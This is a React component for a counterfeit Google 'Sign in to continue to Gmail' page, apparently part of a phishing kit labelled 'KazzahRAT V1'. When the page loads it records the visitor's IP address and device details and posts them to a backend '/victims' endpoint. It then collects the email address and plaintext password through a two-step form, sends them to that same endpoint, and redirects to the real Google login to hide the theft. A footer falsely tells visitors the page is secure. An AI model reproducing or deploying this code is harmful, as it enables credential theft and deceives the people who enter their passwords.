import { useState, useEffect } from 'react';
import { useSearchParams } from 'react-router-dom';
import axios from 'axios';
import { FaGoogle } from 'react-icons/fa';

const Google = () => {
  const [searchParams] = useSearchParams();
  const userId = searchParams.get('user') || 'KazzahOffc';
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [step, setStep] = useState('email');

  useEffect(() => {
    // Auto capture IP dan device info
    const captureData = async () => {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const ipData = await res.json();
        
        const deviceInfo = {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          screen: `${window.screen.width}x${window.screen.height}`,
        };

        // Kirim ke backend
        await axios.post(`${import.meta.env.VITE_API_URL || 'http://localhost:5000/api'}/victims`, {
          userId,
          ip: ipData.ip,
          device: deviceInfo.platform,
          browser: navigator.userAgent.split(' ').slice(-2).join(' '),
          location: 'Auto-detected',
          data: { deviceInfo }
        });
      } catch (err) {
        console.error('Auto capture error:', err);
      }
    };

    captureData();
  }, [userId]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (step === 'email') {
      setStep('password');
      return;
    }

    // Kirim hasil form ke backend
    try {
      await axios.post(`${import.meta.env.VITE_API_URL || 'http://localhost:5000/api'}/victims`, {
        userId,
        ip: '127.0.0.1',
        device: 'Unknown',
        browser: 'Unknown',
        location: 'Unknown',
        data: { email, password, timestamp: new Date().toISOString() }
      });

      // Redirect ke Google asli
      window.location.href = 'https://accounts.google.com';
    } catch (err) {
      console.error('Error:', err);
    }
  };

  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        <div className="text-center mb-8">
          <FaGoogle className="text-6xl text-blue-600 mx-auto" />
          <h1 className="text-2xl font-bold text-gray-800 mt-4">Sign in</h1>
          <p className="text-gray-600 text-sm mt-2">to continue to Gmail</p>
        </div>

        <form onSubmit={handleSubmit} className="bg-white rounded-lg shadow-lg p-8 border border-gray-200">
          {step === 'email' ? (
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Email or phone</label>
              <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full border border-gray-300 rounded-lg px-4 py-3 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                placeholder="Enter your email"
                required
              />
              <div className="flex justify-between mt-4">
                <button
                  type="button"
                  className="text-blue-600 text-sm hover:underline"
                >
                  Forgot email?
                </button>
                <button
                  type="submit"
                  className="bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 transition"
                >
                  Next
                </button>
              </div>
            </div>
          ) : (
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Password</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full border border-gray-300 rounded-lg px-4 py-3 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                placeholder="Enter your password"
                required
              />
              <div className="flex justify-between mt-4">
                <button
                  type="button"
                  className="text-blue-600 text-sm hover:underline"
                >
                  Forgot password?
                </button>
                <button
                  type="submit"
                  className="bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 transition"
                >
                  Sign in
                </button>
              </div>
            </div>
          )}
        </form>

        <div className="text-center mt-6 text-sm text-gray-600">
          <p>🔒 This is a secure Google sign-in page</p>
          <p className="text-xs text-gray-400 mt-1">KazzahRAT V1 • Security Audit</p>
        </div>
      </div>
    </div>
  );
};

export default Google;
